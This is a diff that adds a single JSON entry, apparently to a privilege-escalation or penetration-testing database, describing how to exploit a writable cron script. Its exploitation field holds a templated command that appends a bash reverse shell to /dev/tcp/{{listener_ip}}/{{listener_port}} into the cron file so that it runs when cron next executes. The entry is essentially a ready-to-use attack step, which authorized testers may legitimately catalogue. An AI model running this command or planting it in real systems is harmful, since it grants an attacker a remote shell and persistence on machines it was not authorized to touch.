@@ -1,0 +1,1 @@
+{"id":"writable_cron_generic","category":"WRITABLE_CRON","binary":null,"cve":null,"exploitation":["echo 'bash -i >& /dev/tcp/{{listener_ip}}/{{listener_port}} 0>&1' >> {{binary}}"],"notes":"Appends reverse shell to a writable cron script. Waits for cron execution.","source":"generic","tags":["cron","writable"],"severity":"high"}
